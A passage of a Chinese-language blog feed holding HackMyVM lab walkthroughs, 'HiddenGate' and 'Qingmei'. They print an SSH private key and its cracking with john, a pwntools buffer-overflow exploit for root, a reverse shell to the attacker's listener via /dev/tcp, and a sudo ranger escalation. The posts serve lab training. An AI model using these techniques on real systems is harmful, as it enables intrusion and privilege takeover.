+BUf4l1YR0Rsb2Oz+xx2/yPcrEhJL03mAEOBvOVkB/CpUVCBhEh/DrY1HRhXoOSdMRinpUs
+RL2aSCDxUGvaXF3Jto5qmsR81zvGOr+d/MAP0jgzFLd+FMaGNHePeaHst2Y+JPCsoGB+rP
+FHMJdEVqksrjQ6xtx88ChHq3w87HqCwL3IguaCRRcRoUC4OjWRk8Ob+RmMN8b15caZBrsl
+3nxMNl6yOJS+onpLWkcdZVgR1YLTVv+R2BJWG+oXMOhLpg/I8SAlqY4ZbOI7vgW6vsQ0ms
+GjivEeAiv16S2YxEb4nzbuwBOQqVpvKXQFCxIzXhmHmNr/MkJMY4L5W9h3CIxKL97nJxwj
+oX+hGPwrBnPT2wzH0wstw3cTuSASi0WRD/RBpAQztwtVH4D6ExyzbOoAW7C5jU9X4Umb14
+RsumGpztVj87UR6U6R6sb3RDbL6mtkGE4BD804rD/QJaakg48wNQ8EheUgJwYVRhGd9LY4
+gaCmTshDSQLkYVfxHvnuvcKlt0ShM=
+-----END OPENSSH PRIVATE KEY-----
+www-data@HiddenGate:/tmp/backup/backup_20250521_222948/sb/.ssh$ 
+</code></pre>
+<h3 id="爆破私钥密码">爆破私钥密码</h3>
+<p>拿到私钥，ssh登录</p>
+<pre><code class="language-bash">www-data@HiddenGate:/tmp/backup/backup_20250521_222948/sb/.ssh$ ssh -i ./id_rsa xiaoyuega@127.0.0.1
+The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:IV6iZTL6D//1Ojh0d8XoSMepPgjyUfV/FpQmf3q35Hg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Could not create directory '/var/www/.ssh' (Permission denied).
+Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
+Enter passphrase for key './id_rsa': 
+xiaoyuega@127.0.0.1's password: 
+</code></pre>
+<p>私钥有密码，开始爆破密码</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ cat wyp    
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDanbd68I
+Gn8cHDrgn3ITvfAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDG/UIHmYrO
+OG9YpMl2eW28QoyMoeJR9eNLsuiH9fQtzQZu29QgH0aZEqeT5XOgDEFzlEtlXwDbA1yQva
+NAv1Owx8oE0Gj25vp6eZY9HHnaT1Y3zxhJGIvLglV9f4OzJnzjtJtxSBNY9hEwdudtzVKt
+qsgu2Rd8M87ao1HjwPxFBdgfqcJ6kfKW8Ismj1f4z4uYtPmYt7qWDgbtFbN5xWi2qs2j1R
+xx/bSmYzG+mwKnpxBRT3LMeQflskzkAKZk6O/Rj98rUk+WagN0kv/DtjJWPM0DNB/czfi4
+xnTBDi+48jsDp1DEQH6dlB6SYh4OOqgKRZ+ZzyOk3GiDFMAkDQVJAAAD0L9wyft/hgdx04
+MdsU6WZnfa7/b/p9A2Xo2Mq6fowcO3n44BPobNDmSKCf5XPlLxBh0cbeTwLnRECltWZ46u
+h35S1VmpKxC6IRLqP9EtuJRP+6pfM3C92pG1MXL+jqK5cNqmgwJjMX5hkABeN4+6oBLI7g
+wN3qbG2NGaYTtpkHTHE9X0vItg8yTdRzxMMJVeRxM95rMQn7ppORxZRpBZQxBixFTrvc3Z
+sbiILySXTZRvmOPylFTXVh+qW3Hz5bw7uEuhCrAtM7F3JRWwtHl6LwFRBAceNQ/4u+lVoL
+y3r+WUqWYQ7ji6YRNMBgq73eYsF1rtB83vSVDYOFv3kCfKfwPTxDZGwQeegldurbXquBui
+dwfJ3QIR5AO7dv4p49XWZFrnD/7aIABA/RWMJOqpuYLio8M0O57fmfOlWVnQS+YDeAzg9A
+kIWPvyK/PO0aRqSbLt1GmvUlmasAOjmwykKOnl6duxghEU8cEv6JeNIvyKj40DRlRGcyJl
+2AdnK1chvzB3mw83dtQqb/RvCDr3DlMeZqA/3t4IpiQmZwRi7FQxos20fwvdkZ1w9q9UWT
+4K7xsom5bMgbp3ujUR3JN7xZYNq3Q/+g/QDM9i0uV3eUSZltb42czfcrHdrIVVHWPci28J
+pfDvDzE1QlyEnCKNH2TcPxaiXgmGsRJ6NCr/CeiahiHEkZiowdSo5fl6+wwXxuBnnO60hG
+8s1en5yJ0j6yslVheHOZT2942jc+CU3oJ5tc3JQW1amI0cJjj0Q8TtOzQIrqiDA8DePrcp
+BUf4l1YR0Rsb2Oz+xx2/yPcrEhJL03mAEOBvOVkB/CpUVCBhEh/DrY1HRhXoOSdMRinpUs
+RL2aSCDxUGvaXF3Jto5qmsR81zvGOr+d/MAP0jgzFLd+FMaGNHePeaHst2Y+JPCsoGB+rP
+FHMJdEVqksrjQ6xtx88ChHq3w87HqCwL3IguaCRRcRoUC4OjWRk8Ob+RmMN8b15caZBrsl
+3nxMNl6yOJS+onpLWkcdZVgR1YLTVv+R2BJWG+oXMOhLpg/I8SAlqY4ZbOI7vgW6vsQ0ms
+GjivEeAiv16S2YxEb4nzbuwBOQqVpvKXQFCxIzXhmHmNr/MkJMY4L5W9h3CIxKL97nJxwj
+oX+hGPwrBnPT2wzH0wstw3cTuSASi0WRD/RBpAQztwtVH4D6ExyzbOoAW7C5jU9X4Umb14
+RsumGpztVj87UR6U6R6sb3RDbL6mtkGE4BD804rD/QJaakg48wNQ8EheUgJwYVRhGd9LY4
+gaCmTshDSQLkYVfxHvnuvcKlt0ShM=
+-----END OPENSSH PRIVATE KEY-----
+                                                                                                                              
+┌──(kali㉿kali)-[~]
+└─$ ssh2john wyp &gt; wypdsb
+
+┌──(kali㉿kali)-[~]
+└─$ john wypdsb --wordlist=/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+fish             (wyp)     
+1g 0:00:00:15 DONE (2025-05-22 10:46) 0.06565g/s 31.51p/s 31.51c/s 31.51C/s 315475..police
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+<p>登录大笔噶</p>
+<pre><code class="language-bash">www-data@HiddenGate:/var/www$ ssh -i /tmp/backup/backup_20250521_222948/sb/.ssh/id_rsa xiaoyuega@127.0.0.1
+The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:IV6iZTL6D//1Ojh0d8XoSMepPgjyUfV/FpQmf3q35Hg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Could not create directory '/var/www/.ssh' (Permission denied).
+Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
+Enter passphrase for key '/tmp/backup/backup_20250521_222948/sb/.ssh/id_rsa': 
+Linux HiddenGate 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed May 21 22:56:49 2025 from 127.0.0.1
+xiaoyuega@HiddenGate:~$ 
+</code></pre>
+<h2 id="提权-root">提权 root</h2>
+<pre><code class="language-bash">xiaoyuega@HiddenGate:~$ cd /home/xiaoyuega
+xiaoyuega@HiddenGate:~$ ls -al
+total 60
+drwxr-x--- 4 xiaoyuega xiaoyuega  4096 May 20 21:01 .
+drwxr-xr-x 3 root      root       4096 May 10 12:17 ..
+lrwxrwxrwx 1 xiaoyuega xiaoyuega     9 May 10 12:49 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 xiaoyuega xiaoyuega   220 May 10 12:17 .bash_logout
+-rw-r--r-- 1 xiaoyuega xiaoyuega  3526 May 10 12:17 .bashrc
+drwxr-xr-x 3 xiaoyuega xiaoyuega  4096 May 20 21:01 .cache
+-rwsr-sr-x 1 root      root      17384 May 11 03:37 cmd
+-rw-r--r-- 1 xiaoyuega xiaoyuega   807 May 10 12:17 .profile
+drwx------ 2 xiaoyuega xiaoyuega  4096 May 10 13:40 .ssh
+-rw------- 1 xiaoyuega xiaoyuega    39 May 11 01:21 userrr.txt
+-rw------- 1 xiaoyuega xiaoyuega   780 May 20 21:00 .viminfo
+</code></pre>
+<p>这是贴心的放我脸上了</p>
+<p>执行一下</p>
+<pre><code class="language-bash">xiaoyuega@HiddenGate:~$ ./cmd
+Please enter command: ls -al 
+root.txt
+Please enter command: cat root.txt
+FAKE{hahaha}
+Please enter command: 
+</code></pre>
+<p>一看就是假的，拉下来反编译一下，发现是经典的缓冲区溢出（懒~~~）</p>
+<pre><code class="language-bash">xiaoyuega@HiddenGate:~$ cat wyp
+from pwn import *
+
+binary = ELF('./cmd')
+hahaha_addr = binary.symbols['hahaha']
+offset = 72
+
+payload = b'A' * offset + p64(hahaha_addr)
+
+p = process('./cmd')
+p.sendline(payload)
+p.interactive()
+
+xiaoyuega@HiddenGate:~$ python3 wyp
+[*] '/home/xiaoyuega/cmd'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+[+] Starting local process './cmd': pid 1270
+[*] Switching to interactive mode
+Please enter command: root shell
+$ id
+uid=0(root) gid=1000(xiaoyuega) groups=1000(xiaoyuega)
+$ cd /root;ls -al
+total 52
+drwx------  5 root root 4096 May 11 04:31 .
+drwxr-xr-x 18 root root 4096 May 11 04:31 ..
+lrwxrwxrwx  1 root root    9 Mar 18 21:18 .bash_history -&gt; /dev/null
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwxr-xr-x  5 root root 4096 May  9 14:35 .cache
+drwx------  3 root root 4096 Apr  4 21:00 .gnupg
+-rw-------  1 root root   28 May  9 13:59 .lesshst
+drwxr-xr-x  3 root root 4096 Mar 18 21:04 .local
+-rw-------  1 root root   94 May 11 04:26 .mysql_history
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   39 May 11 03:39 root.txt
+-rw-r--r--  1 root root 8192 May 11 03:48 typescript
+-rw-------  1 root root 3564 May 11 04:31 .viminfo
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Qingmei 靶机复盘]]></title>
+        <id>https://zhangbsb.github.io/post/qingmei-ba-ji-fu-pan/</id>
+        <link href="https://zhangbsb.github.io/post/qingmei-ba-ji-fu-pan/">
+        </link>
+        <updated>2025-05-23T02:30:18.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="qingmei-靶机复盘">Qingmei 靶机复盘</h1>
+<h3 id="难度-low">难度-Low</h3>
+<p>5月19日，星期一</p>
+<h2 id="网段扫描">网段扫描</h2>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ sudo netdiscover -i eth2 -r 192.168.77.0/24  
+[sudo] kali 的密码：
+ Currently scanning: 192.168.77.0/24   |   Screen View: Unique Hosts                                                         
+                                                                                                                             
+ 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                             
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.77.1    00:50:56:c0:00:08      1      60  VMware, Inc.                                                              
+ 192.168.77.46   08:00:27:ce:fb:89      1      60  PCS Systemtechnik GmbH                                                    
+ 192.168.77.254  00:50:56:ee:b8:1a      1      60  VMware, Inc.                                                              
+ 192.168.77.254  00:50:56:f4:d7:51      1      60  VMware, Inc.                                                              
+
+</code></pre>
+<h2 id="端口扫描">端口扫描</h2>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ sudo nmap 192.168.77.46 -p-                
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-19 10:40 CST
+Nmap scan report for 192.168.77.46
+Host is up (0.00049s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:CE:FB:89 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.55 seconds
+
+</code></pre>
+<p>我们发现22 和 80 端口开始访问网页</p>
+<figure data-type="image" tabindex="1"><img src="https://zhangbsb.github.io/post-images/1747967678744.png" alt="" loading="lazy"></figure>
+<p>查看源码</p>
+<pre><code class="language-html">&lt;h1&gt;
+&lt;pre&gt;
+				  .     **                                     
+                                *           *.                                  
+                                              ,*                                
+                                                 *,                             
+                         ,                         ,*                           
+                      .,                              *,                        
+                    /                                    *                      
+                 ,*                                        *,                   
+               /.                                            .*.                
+             *                                                  **              
+             ,*                                               ,*                
+                **                                          *.                  
+                   **                                    **.                    
+                     ,*                                **                       
+                        *,                          ,*                          
+                           *                      **                            
+                             *,                .*                               
+                                *.           **                                 
+                                  **      ,*,                                   
+                                     ** *,     HackMyVM
+
+QQ Group:   660930334
+&lt;/h1&gt;
+&lt;/pre&gt;
+</code></pre>
+<p>并没有发现什么可用信息</p>
+<h2 id="扫描目录">扫描目录</h2>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ sudo dirsearch -u http://192.168.77.46 -t 128
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 128 | Wordlist size: 11460
+
+Output File: /home/kali/reports/http_192.168.77.46/_25-05-19_10-43-33.txt
+
+Target: http://192.168.77.46/
+
+[10:43:33] Starting: 
+[10:43:34] 403 -  278B  - /.ht_wsr.txt                                      
+[10:43:34] 403 -  278B  - /.htaccess.sample                                 
+[10:43:34] 403 -  278B  - /.htaccess.orig
+[10:43:34] 403 -  278B  - /.htaccess.save
+[10:43:34] 403 -  278B  - /.htaccess.bak1                                   
+[10:43:34] 403 -  278B  - /.htaccess_extra                                  
+[10:43:34] 403 -  278B  - /.htaccess_sc
+[10:43:34] 403 -  278B  - /.htaccess_orig
+[10:43:34] 403 -  278B  - /.htaccessOLD
+[10:43:34] 403 -  278B  - /.htaccessBAK
+[10:43:34] 403 -  278B  - /.htaccessOLD2                                    
+[10:43:34] 403 -  278B  - /.html
+[10:43:34] 403 -  278B  - /.htm                                             
+[10:43:34] 403 -  278B  - /.htpasswd_test                                   
+[10:43:34] 403 -  278B  - /.htpasswds
+[10:43:34] 403 -  278B  - /.httr-oauth                                      
+[10:43:35] 403 -  278B  - /.php                                             
+[10:44:06] 403 -  278B  - /server-status                                    
+[10:44:06] 403 -  278B  - /server-status/
+                                                                             
+Task Completed
+
+</code></pre>
+<p>经过简单扫描并没有发现可用信息</p>
+<p>开始深入扫描</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ sudo gobuster dir -u http://192.168.77.46 -x php,zip,png,jpg,zip,html,txt -t 128 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+</code></pre>
+<h2 id="获取shell">获取shell</h2>
+<p>因为时间太长，就给它放到一边，开始尝试另一个端口，猜测</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ ssh HackMyyVM@192.168.77.46
+The authenticity of host '192.168.77.46 (192.168.77.46)' can't be established.
+ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:1: [hashed name]
+    ~/.ssh/known_hosts:3: [hashed name]
+    ~/.ssh/known_hosts:4: [hashed name]
+    ~/.ssh/known_hosts:5: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.77.46' (ED25519) to the list of known hosts.
+ _____________
+( guest/guest )
+ -------------
+        o   ^__^
+         o  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+HackMyyVM@192.168.77.46's password: 
+Permission denied, please try again.
+
+</code></pre>
+<p>失败但是给出了<code>guest</code></p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ ssh guest@192.168.77.46
+ _____________
+( guest/guest )
+ -------------
+        o   ^__^
+         o  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+guest@192.168.77.46's password: 
+Linux Qingmei 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Connection to 192.168.77.46 closed.
+
+</code></pre>
+<p>我们用用户 <code>guest</code> ,密码<code>guest</code>进去之后明显发现是<code>less</code></p>
+<p>使用</p>
+<pre><code class="language-b">!id
+uid=1000(guest) gid=1000(guest) groups=1000(guest)
+!done  (press RETURN)
+</code></pre>
+<p>有反应</p>
+<pre><code class="language-b">!bash -p
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ ____________
+&lt; Are u ok ? &gt;
+ ------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+banner (END)
+
+</code></pre>
+<p>不行，那反弹<code>shell</code></p>
+<pre><code class="language-bash">#主机监听1234
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+
+</code></pre>
+<pre><code class="language-bash">!sh -i &gt;&amp; /dev/tcp/192.168.77.2/1234 0&gt;&amp;1
+</code></pre>
+<p>成功反弹</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.77.2] from (UNKNOWN) [192.168.77.46] 40372
+$ id
+uid=1000(guest) gid=1000(guest) groups=1000(guest)
+$ 
+
+</code></pre>
+<p>进去以后我们发现，<code>morri</code>没有权限访问查看<code>guest</code></p>
+<pre><code class="language-bash">$ cd /home
+$ ls -al
+total 16
+drwxr-xr-x  4 root  root  4096 May 18 09:55 .
+drwxr-xr-x 18 root  root  4096 Mar 18 20:37 ..
+drwxr-xr-x  2 guest guest 4096 May 18 09:55 guest
+drwx------  2 morri morri 4096 May 18 09:56 morri
+$ cd guest
+$ ls -al
+total 24
+drwxr-xr-x 2 guest guest 4096 May 18 09:55 .
+drwxr-xr-x 4 root  root  4096 May 18 09:55 ..
+-rw-r--r-- 1 root  root   166 May 18 09:55 banner
+-rw-r--r-- 1 guest guest  220 May 18 09:54 .bash_logout
+-rw-r--r-- 1 guest guest 3543 May 18 09:55 .bashrc
+-rw-r--r-- 1 guest guest  807 May 18 09:54 .profile
+
+</code></pre>
+<p>但是用着难受我们改一下，查看<code>.bashrc</code></p>
+<pre><code class="language-bash">$ cat .bashrc
+# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+
+# If not running interactively, don't do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+# don't put duplicate lines or lines starting with space in the history.
+# See bash(1) for more options
+HISTCONTROL=ignoreboth
+
+# append to the history file, don't overwrite it
+shopt -s histappend
+
+# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
+HISTSIZE=1000
+HISTFILESIZE=2000
+
+# check the window size after each command and, if necessary,
+# update the values of LINES and COLUMNS.
+shopt -s checkwinsize
+
+# If set, the pattern &quot;**&quot; used in a pathname expansion context will
+# match all files and zero or more directories and subdirectories.
+#shopt -s globstar
+
+# make less more friendly for non-text input files, see lesspipe(1)
+#[ -x /usr/bin/lesspipe ] &amp;&amp; eval &quot;$(SHELL=/bin/sh lesspipe)&quot;
+
+# set variable identifying the chroot you work in (used in the prompt below)
+if [ -z &quot;${debian_chroot:-}&quot; ] &amp;&amp; [ -r /etc/debian_chroot ]; then
+    debian_chroot=$(cat /etc/debian_chroot)
+fi
+
+# set a fancy prompt (non-color, unless we know we &quot;want&quot; color)
+case &quot;$TERM&quot; in
+    xterm-color|*-256color) color_prompt=yes;;
+esac
+
+# uncomment for a colored prompt, if the terminal has the capability; turned
+# off by default to not distract the user: the focus in a terminal window
+# should be on the output of commands, not on the prompt
+#force_color_prompt=yes
+
+if [ -n &quot;$force_color_prompt&quot; ]; then
+    if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then
+	# We have color support; assume it's compliant with Ecma-48
+	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
+	# a case would tend to support setf rather than setaf.)
+	color_prompt=yes
+    else
+	color_prompt=
+    fi
+fi
+
+if [ &quot;$color_prompt&quot; = yes ]; then
+    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
+else
+    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
+fi
+unset color_prompt force_color_prompt
+
+# If this is an xterm set the title to user@host:dir
+case &quot;$TERM&quot; in
+xterm*|rxvt*)
+    PS1=&quot;\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1&quot;
+    ;;
+*)
+    ;;
+esac
+
+# enable color support of ls and also add handy aliases
+if [ -x /usr/bin/dircolors ]; then
+    test -r ~/.dircolors &amp;&amp; eval &quot;$(dircolors -b ~/.dircolors)&quot; || eval &quot;$(dircolors -b)&quot;
+    alias ls='ls --color=auto'
+    #alias dir='dir --color=auto'
+    #alias vdir='vdir --color=auto'
+
+    #alias grep='grep --color=auto'
+    #alias fgrep='fgrep --color=auto'
+    #alias egrep='egrep --color=auto'
+fi
+
+# colored GCC warnings and errors
+#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
+
+# some more ls aliases
+#alias ll='ls -l'
+#alias la='ls -A'
+#alias l='ls -CF'
+
+# Alias definitions.
+# You may want to put all your additions into a separate file like
+# ~/.bash_aliases, instead of adding them here directly.
+# See /usr/share/doc/bash-doc/examples in the bash-doc package.
+
+if [ -f ~/.bash_aliases ]; then
+    . ~/.bash_aliases
+fi
+
+# enable programmable completion features (you don't need to enable
+# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
+# sources /etc/bash.bashrc).
+if ! shopt -oq posix; then
+  if [ -f /usr/share/bash-completion/bash_completion ]; then
+    . /usr/share/bash-completion/bash_completion
+  elif [ -f /etc/bash_completion ]; then
+    . /etc/bash_completion
+  fi
+fi
+less banner
+exit
+
+</code></pre>
+<p>发现结尾<code>less banner</code>,并退出</p>
+<p>我们将这两行删除，重新ssh连接</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ ssh guest@192.168.77.46
+ _____________
+( guest/guest )
+ -------------
+        o   ^__^
+         o  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+guest@192.168.77.46's password: 
+Linux Qingmei 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun May 18 23:01:46 2025 from 192.168.77.2
+guest@Qingmei:~$ 
+</code></pre>
+<h2 id="提权morri">提权<code>morri</code></h2>
+<pre><code class="language-bash">guest@Qingmei:~$ cd /opt
+guest@Qingmei:/opt$ ls -al
+total 32
+drwxr-xr-x  2 root root  4096 May 18 10:12 .
+drwxr-xr-x 18 root root  4096 Mar 18 20:37 ..
+-rw-r--r--  1 root root   169 May 18 09:53 banner.txt
+-rwx-----x  1 root root 17024 May 18 10:12 morri_password
+
+</code></pre>
+<p>发现可执行文件，运行</p>
+<pre><code class="language-bash">guest@Qingmei:/opt$ ./morri_password 
+You need to input strings of 'A's with correct lengths (10-50 characters).
+You'll be asked to do this 10 times.
+
+Try 1/10: Please input exactly 17 'A's: 
+
+</code></pre>
+<p>一个小游戏，只用10次，自己python一下，手动都行</p>
+<pre><code class="language-bash">user:morri pass:morri
+</code></pre>
+<p>开始后悔没有自己试一下弱密码</p>
+<pre><code class="language-bash">guest@Qingmei:/opt$ su morri
+Password: 
+morri@Qingmei:/opt$ sudo -l
+Matching Defaults entries for morri on Qingmei:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User morri may run the following commands on Qingmei:
+    (ALL) NOPASSWD: /usr/bin/ranger
+
+</code></pre>
+<h2 id="提权root">提权root</h2>
+<p>发现ranger,去百度一下，非常简单进去直接大写<code>S</code></p>
+<pre><code class="language-bash">morri@Qingmei:/opt$ sudo /usr/bin/ranger
+root@Qingmei:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Qingmei:~# 
+</code></pre>
+]]></content>
+    </entry>
+</feed>
